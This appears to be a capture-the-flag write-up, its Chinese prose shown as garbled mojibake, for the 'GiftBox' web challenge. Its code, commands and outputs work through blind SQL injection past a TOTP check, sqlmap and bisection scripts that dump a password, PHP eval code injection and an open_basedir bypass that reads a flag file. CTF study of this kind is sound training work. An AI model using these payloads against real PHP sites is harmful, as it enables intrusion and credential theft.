<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='1 admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='0 admin</span><br><span class="line">login fail, user not found.</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹æ•°æ®åŒ…ï¼Œçœ‹åˆ°æœ‰ä¸ª <strong><code>totp</code></strong>ï¼Œå†æ¬¡æäº¤ä¹‹åè¿™ä¸ª <strong><code>totp</code></strong> åˆä¼šå‘ç”Ÿæ”¹å˜</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" class="lazyload" title="gift5"></a></p>
<hr>
<h2 id="æŸ¥äº†ä¸€ä¸‹-TOTP"><a href="#æŸ¥äº†ä¸€ä¸‹-TOTP" class="headerlink" title="æŸ¥äº†ä¸€ä¸‹ TOTP"></a>æŸ¥äº†ä¸€ä¸‹ TOTP</h2><p><a href="https://baike.baidu.com/item/TOTP%E7%AE%97%E6%B3%95/22810708?fr=aladdin" target="_blank" rel="noopener">TOTPç®—æ³•</a> (<code>Time-based One-time Password algorithm</code>)æ˜¯ä¸€ç§ä»å…±äº«å¯†é’¥å’Œå½“å‰æ—¶é—´è®¡ç®—ä¸€æ¬¡æ€§å¯†ç çš„ç®—æ³•ã€‚</p>
<p><strong><font color="6495ED">ä¸€äº›è¦æ±‚</font></strong>ï¼š</p>
<ul>
<li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»æ—¶é’ŸåŒæ­¥ï¼›</li>
<li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»å…±äº«å¯†é’¥ï¼›</li>
<li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»ä½¿ç”¨ç›¸åŒçš„æ—¶é—´æ­¥é•¿</li>
</ul>
<p><strong><font color="6495ED">æ ¸å¿ƒç®—æ³•</font></strong>ï¼š<br><strong><font color="6495ED">TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))</font></strong><br><strong><font color="6495ED">X</font></strong> æ˜¯æ—¶é—´é—´éš”</p>
<hr>
<p>ç„¶ååœ¨ <code>main.js</code> æ‰¾åˆ°äº†å¯†é’¥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" class="lazyload" title="gift5"></a></p>
<p>åœ¨è¿™ä¸Šé¢çš„æ³¨é‡Šé‡Œä¹Ÿç»™å‡ºäº†æç¤º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[Developer Notes]</span><br><span class="line">OTP Library <span class="keyword">for</span> Python located <span class="keyword">in</span> js/pyotp.zip</span><br><span class="line">Server Params:</span><br><span class="line">digits = <span class="number">8</span></span><br><span class="line">interval = <span class="number">5</span></span><br><span class="line"><span class="built_in">window</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åè·Ÿè¿›å»çœ‹ <code>totp.min.js</code> å¯ä»¥çœ‹åˆ°æœ€åæœ‰æ–°çš„ <code>hint</code> (è™½ç„¶ä½œç”¨ä¸å¤§233</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Two-factor authentication implementation <span class="keyword">in</span> pure javascript.</span><br><span class="line">One-time password generator (HOTP/TOTP) <span class="keyword">with</span> support <span class="keyword">for</span> Google Authenticator.</span><br><span class="line">@author   wuyanxin &lt;https:<span class="comment">//wuyanxin.com&gt;</span></span><br><span class="line">@license  MIT</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨gayå§æ‰¾åˆ°äº† <a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">https://github.com/wuyanxin/totp.js</a><br>(ç®—æ³•è¿˜æ˜¯æŒºå¥½ç†è§£çš„)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" class="lazyload" title="gift5"></a></p>
<p>å¯ä»¥çœ‹åˆ°ç¼ºçœå€¼å°±æ˜¯5</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" class="lazyload" title="gift5"></a></p>
<p>ç„¶åçœ‹äº†å¤§ä½¬çš„å†™æ³•</p>
<hr>
<h2 id="è·å–-sql-å¯†ç "><a href="#è·å–-sql-å¯†ç " class="headerlink" title="è·å– sql å¯†ç "></a>è·å– sql å¯†ç </h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>ç”¨ <code>flask</code> æ­å»ºä¸€ä¸ªæœ¬åœ°æœåŠ¡å¹¶æ¥å—å‚æ•°ä¼ åˆ°é¶æœºï¼Œç„¶åç”¨ <code>sqlmap</code> å»è·‘æœ¬åœ°é¶æœº</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">fuzz=string.printable</span><br><span class="line"><span class="meta">@app.route('/username=&lt;username&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(username)</span>:</span></span><br><span class="line">    url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">    username=(username).replace(<span class="string">' '</span>,<span class="string">'/**/'</span>)</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login &#123;&#125; admin'</span>.format(username),</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,params=params)</span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨ä¹‹å ç”¨ <code>sqlmap</code> å»è·‘</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span> -D giftbox -T users -C password --dump  --technique B</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span></span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°å¯†ç : <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p>
<h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>æ¥è‡ª<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">èµµå¸ˆå‚…</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># --- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># db_nums_payload = "select/**/count(*)/**/from/**/users"</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print("é•¿åº¦ä¸ºï¼š%d" % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    db_payload = <span class="string">"select/**/concat(password)/**/from/**/users"</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (y)</span><br><span class="line">        db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"å€¼ï¼š"</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># äºŒåˆ†æ³•å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>åŒæ ·ä¼šå¾—åˆ°å¯†ç : <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p>
<hr>
<h2 id="ç™»é™†"><a href="#ç™»é™†" class="headerlink" title="ç™»é™†"></a>ç™»é™†</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br><span class="line">login success.</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¯•ä¸€ä¸‹ <code>targeting</code> <code>launch</code> <code>destruct</code> ç­‰ç­‰å‘½ä»¤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" class="lazyload" title="gift5"></a></p>
<p>ä»¥åŠ <code>hint</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named <span class="string">'eval'</span> when launching missiles.</span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ° <code>eval</code> çŸ¥é“è€ƒç‚¹æ˜¯RCEä»£ç æ³¨å…¥<br>ç„¶åç½‘ä¸Šæ‰¾åˆ°äº†è¿™ä¸ª<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">ä»ä¸€é“é¢˜è®²PHPå¤æ‚å˜é‡</a></p>
<ul>
<li>phpä¼šå¤„ç†åŒå¼•å·é‡Œé¢çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ï¼š</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"abc"</span>;</span><br><span class="line">$b=<span class="string">"$a"</span>;  è¾“å‡ºabc</span><br><span class="line">$b=<span class="string">"\$a"</span>; è¾“å‡º$a</span><br><span class="line">$b=<span class="string">'$a'</span>;  è¾“å‡º$a</span><br></pre></td></tr></table></figure></div>

<ul>
<li>å¦‚æœ <code>{</code> å’Œ <code>$</code> ç´§æŒ¨ç€ä¹Ÿä¼šè¡¨ç¤ºä¸€ä¸ªå˜é‡</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$great = <span class="string">'fantastic'</span>;</span><br><span class="line"></span><br><span class="line">æ— æ•ˆï¼Œè¾“å‡º: This is &#123; fantastic&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123; $great&#125;"</span>;</span><br><span class="line"></span><br><span class="line">æœ‰æ•ˆï¼Œè¾“å‡ºï¼š This is fantastic</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123;$great&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is $&#123;great&#125;"</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>bypass<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"$&#123;phpinfo()&#125;"</span>;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">$a=$&#123;phpinfo()&#125;;</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<p>ç…§ç€ä¸Šé¢çš„æ€è·¯ </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" data-fancybox="group" data-caption="gift9_2" class="fancybox"><img alt="gift9_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" class="lazyload" title="gift9_2"></a></p>
<p>å°† <code>Error</code> çš„ å†…å®¹ä¿å­˜æœ¬åœ° å¯ä»¥çœ‹åˆ°å°±æ˜¯ <code>phpinfo</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" class="lazyload" title></a></p>
<p>å¯ä»¥çœ‹åˆ° <code>open_basedir</code> é™åˆ¶äº†è·¯å¾„<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" class="lazyload" title></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" class="lazyload" title></a></p>
<p>ç„¶åçœ‹ä¸€ä¸‹å…¶ä»–è¿‡æ»¤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" class="lazyload" title></a></p>
<p><strong><font color="6495ED">code</font></strong> é•¿åº¦é™åˆ¶2ä½</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" class="lazyload" title></a></p>
<p><strong><font color="6495ED">position</font></strong> é•¿åº¦é™åˆ¶12ä½ï¼ŒåŒæ ·éƒ½å­˜åœ¨ <code>\</code> çš„è¿‡æ»¤(å…¶å®ä¹Ÿç®€å•ï¼Œç”¨ <code>chr()</code> ç»•è¿‡)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" class="lazyload" title></a></p>
<p>æ€»ç»“ä¸€ä¸‹è¿è¡Œè¿‡ç¨‹</p>
<ul>
<li><font color="6495ED">targeting code position</font> -&gt; å‚¨å­˜ä¸€æ¡ <code>$code = &quot;position&quot;</code>;</li>
<li><font color="6495ED">launch</font> -&gt; å°†ä¸Šé¢ <code>targeting</code> çš„ <code>code</code>  æŒ‰ç…§å­—å…¸é¡ºåºè·‘ä¸€é</li>
<li><font color="6495ED">destuct</font> -&gt; å…¨éƒ¨æ¸…ç©ºï¼Œæ¢å¤åˆå§‹çŠ¶æ€</li>
</ul>
<p>ç„¶åæŒ‰ç…§ä¸Šé¢ <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">open_basedirç»•è¿‡</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure></div>

<h2 id="æœ€åexp"><a href="#æœ€åexp" class="headerlink" title="æœ€åexp"></a>æœ€åexp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>,</span><br><span class="line">                    params=&#123;<span class="string">'a'</span>: <span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'targeting '</span> + code + <span class="string">' '</span> + position, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'launch'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destuct</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'destruct'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    destuct()</span><br><span class="line">    targeting(<span class="string">"a"</span>, <span class="string">"chdir"</span>)</span><br><span class="line">    targeting(<span class="string">"b"</span>, <span class="string">"img"</span>)</span><br><span class="line">    targeting(<span class="string">"c"</span>, <span class="string">"&#123;$a($b)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"d"</span>, <span class="string">"ini_set"</span>)</span><br><span class="line">    targeting(<span class="string">"e"</span>, <span class="string">"open_basedir"</span>)</span><br><span class="line">    targeting(<span class="string">"f"</span>, <span class="string">".."</span>)</span><br><span class="line">    targeting(<span class="string">"g"</span>, <span class="string">"&#123;$d($e,$f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"h"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"i"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"j"</span>, <span class="string">"Ly8v"</span>)</span><br><span class="line">    targeting(<span class="string">"k"</span>, <span class="string">"base64_"</span>)</span><br><span class="line">    targeting(<span class="string">"l"</span>, <span class="string">"decode"</span>)</span><br><span class="line">    targeting(<span class="string">"m"</span>, <span class="string">"$k$l"</span>)</span><br><span class="line">    targeting(<span class="string">"n"</span>, <span class="string">"&#123;$m($j)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"o"</span>, <span class="string">"&#123;$d($e,$n)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"p"</span>, <span class="string">"flag"</span>)</span><br><span class="line">    targeting(<span class="string">"q"</span>, <span class="string">"file_get"</span>)</span><br><span class="line">    targeting(<span class="string">"r"</span>, <span class="string">"_contents"</span>)</span><br><span class="line">    targeting(<span class="string">"s"</span>, <span class="string">"$q$r"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"t"</span>, <span class="string">"&#123;$s($p)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    print(launch())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>,</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url,params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'destruct'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'launch'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now(),</span><br><span class="line">        <span class="comment">#'w':'''print_r(scandir('.'));'''</span></span><br><span class="line">        <span class="comment">#imgæ˜¯å½“å‰ç›®å½•çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥æ”¹ä¸ºå…¶ä»–å½“å‰ç›®å½•æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="string">'w'</span>: <span class="string">'''chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/flag');'''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code,pos)</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'targeting &#123;&#125; &#123;&#125;'</span>.format(code,pos),</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line">print(login().text)</span><br><span class="line"><span class="comment">###phpinfoæµ‹è¯•</span></span><br><span class="line"><span class="comment">#targeting('a','phpinfo')</span></span><br><span class="line"><span class="comment">#targeting('b','&#123;$a()&#125;')</span></span><br><span class="line"><span class="comment">#print(launch().text)</span></span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'&#123;$_GET&#123;w&#125;&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'$&#123;eval($a)&#125;'</span>)</span><br><span class="line">print(launch().text)</span><br></pre></td></tr></table></figure></div>

